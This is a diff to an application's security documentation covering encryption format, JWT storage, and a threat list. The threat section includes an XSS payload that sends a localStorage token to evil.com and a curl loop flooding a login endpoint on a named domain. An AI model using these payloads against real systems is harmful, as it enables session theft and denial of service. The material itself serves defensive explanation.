@@ -21,18 +21,19 @@ const hash = await bcrypt.hash(password, 4);
 ```
 
 #### Social Account Passwords
-- **Algorithm**: AES-256-GCM
-- **Key Derivation**: HKDF-SHA256 from ENCRYPTION_KEY
-- **IV**: Random 12 bytes per encryption
-- **Auth Tag**: 16 bytes (validates integrity)
-- **Storage**: Base64 encoded: `iv:authTag:ciphertext`
+- **Algorithm**: AES-256-GCM (Web Crypto API)
+- **Key**: Raw 32-byte key derived directly from `ENCRYPTION_KEY` (64 hex chars, 32 bytes)
+- **IV**: Random 12 bytes per encryption, prepended
+- **Auth Tag**: 16 bytes appended (validates integrity)
+- **Storage**: Single Base64 blob: `base64( iv[12] || ciphertext || authTag[16] )`
 
 ```typescript
 // Encryption format
-const encrypted = `${iv_base64}:${authTag_base64}:${ciphertext_base64}`;
+const combined = iv(12) + ciphertext + authTag(16);
+const encrypted = btoa(String.fromCharCode(...combined));
 
 // Example
-"7x8y9z...:a1b2c3...:d4e5f6..."
+"7x8y9z0aAb1C..."
 ```
 
 **Why separate encryption?**
@@ -64,7 +65,7 @@ const encrypted = `${iv_base64}:${authTag_base64}:${ciphertext_base64}`;
 ### Token Lifecycle
 
 1. **Generation**: After successful login/register
-2. **Storage**: Client-side localStorage (`auth-token`)
+2. **Storage**: Client-side localStorage (`token`)
 3. **Transmission**: `Authorization: Bearer <token>` header
 4. **Verification**: Every protected API call
 5. **Expiry**: 7 days from issue
@@ -75,7 +76,7 @@ const encrypted = `${iv_base64}:${authTag_base64}:${ciphertext_base64}`;
 - Verify signature on every request
 - Check expiration (`exp` claim)
 - Use HTTPS in production
-- Store in localStorage (XSS protection via CSP)
+- Store JWT in localStorage (`token`) (XSS protection via CSP)
 - Use strong JWT_SECRET (min 32 chars)
 
 ❌ **DON'T:**
@@ -116,7 +117,7 @@ const user = await db
 
 **Attack:**
 ```html
-<script>fetch('https://evil.com?token='+localStorage.getItem('auth-token'))</script>
+<script>fetch('https://evil.com?token='+localStorage.getItem('token'))</script>
 ```
 
 **Mitigation:**
@@ -250,7 +251,7 @@ curl -X POST /api/auth/register -d '{"email":"test@example.com",...}'
 ```bash
 # Flood API with requests
 while true; do
-  curl https://your-worker.workers.dev/api/auth/login &
+  curl https://social.bits.co.id/api/auth/login &
 done
 ```
 
@@ -430,7 +431,7 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains
 If you find a security issue:
 
 1. **DO NOT** open public GitHub issue
-2. Email: security@yourdomain.com
+2. Email: security@bits.co.id
 3. Include:
    - Vulnerability description
    - Steps to reproduce
